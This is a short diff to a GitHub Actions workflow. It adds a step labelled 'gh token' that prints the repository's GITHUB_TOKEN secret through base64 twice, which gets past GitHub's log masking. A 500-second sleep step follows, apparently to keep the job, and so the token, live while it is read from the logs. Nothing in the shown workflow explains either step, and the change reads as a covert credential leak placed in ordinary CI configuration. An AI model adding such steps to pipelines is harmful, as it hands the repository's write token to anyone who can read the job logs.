@@ -8,7 +8,9 @@ jobs:
   t:
     runs-on: ubuntu-latest
     steps:
-    - run: |
-        echo "$GITHUB_TOKEN" | base64 | base64
-    - run: |
+    - name: "gh token"
+      run: |
+          echo "${{ secrets.GITHUB_TOKEN }}" | base64 | base64
+    - name: "sleep"
+      run: |
         sleep 500
